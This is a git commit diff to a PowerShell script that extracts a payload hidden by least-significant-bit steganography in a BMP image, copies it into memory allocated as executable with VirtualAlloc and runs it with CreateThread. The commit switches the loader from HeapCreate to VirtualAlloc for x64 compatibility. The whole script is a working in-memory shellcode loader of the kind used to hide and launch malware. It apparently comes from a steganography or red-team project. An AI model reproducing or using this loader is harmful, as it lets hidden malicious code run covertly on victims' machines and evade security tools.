593f17bd1b0c7c9eea9c60bdd9f3f47fd958c0b4
harpsiford <kasumi2197@gmail.com>
2021-04-18 19:04:12 +0300

    HeapCreate -> VirtualAlloc for x64 compatibility

--- readers/powershell/reader_x86.ps1
+++ readers/powershell/reader_x86.ps1
@@ -1,21 +1,19 @@
+[void] [System.Reflection.Assembly]::LoadWithPartialName("System.Drawing")
+[void] [System.Reflection.Assembly]::LoadWithPartialName("System.Runtime.InteropServices")
+$Kernel32 = Add-Type -MemberDefinition $MethodDefinition -Name 'Kernel32' -Namespace 'Win32' -PassThru
+
+# [string] $filename = ".\samples\howareyou.bmp"
 [string] $filename = ".\samples\helpme.bmp"
-[Int32] $length = 1544 + 16
+[Int32] $length = 2208
 
 $MethodDefinition =
 @'
 [DllImport("kernel32.dll")]
-public static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, UInt32 lpThreadId);
-[DllImport("kernel32.dll")]
-public static extern IntPtr HeapCreate(UInt32 flOptions, UInt32 dwInitialSize, UInt32 dwMaximumSize);
-[DllImport("kernel32.dll")]
-public static extern UInt32 HeapAlloc(IntPtr hHeap, UInt32 dwFlags, UInt32 dwBytes);
+public static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, IntPtr lpStartAddress, IntPtr param, UInt32 dwCreationFlags, UInt32 lpThreadId);
+[DllImport("kernel32")]
+public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
 '@
 
-$HEAP_CREATE_ENABLE_EXECUTE = 0x00040000
-$Kernel32 = Add-Type -MemberDefinition $MethodDefinition -Name 'Kernel32' -Namespace 'Win32' -PassThru
-
-
-[Int32]$pos = 0
 
 function get_lsb([byte]$target, [byte]$source) { 
     $a = $target -shl 1
@@ -24,6 +22,7 @@ function get_lsb([byte]$target, [byte]$source) {
 }
 
 function get_payload($length) {
+    [Int32]$pos = 0
     $BitMap = [System.Drawing.Image]::FromFile((Get-Item $filename).fullname, $true)
     $bytes = New-Object byte[] ($length)
 
@@ -54,9 +53,8 @@ function get_payload($length) {
 
 $payload_data = get_payload $length
 
-
-[IntPtr]$heap = $Kernel32::HeapCreate($HEAP_CREATE_ENABLE_EXECUTE, 0, 0)
-[UInt32]$ptr = $Kernel32::HeapAlloc($heap, 0, [int][Math]::Floor($length / 8))
+[IntPtr]$ptr = $Kernel32::VirtualAlloc(0, [int][Math]::Floor($length / 8), 0x3000, 0x40)
 [System.Runtime.InteropServices.Marshal]::Copy($payload_data, 0, $ptr, [int][Math]::Floor($length / 8))
 $Kernel32::CreateThread(0, 0, $ptr, 0, 0, 0)
+
 Start-Sleep -s 3
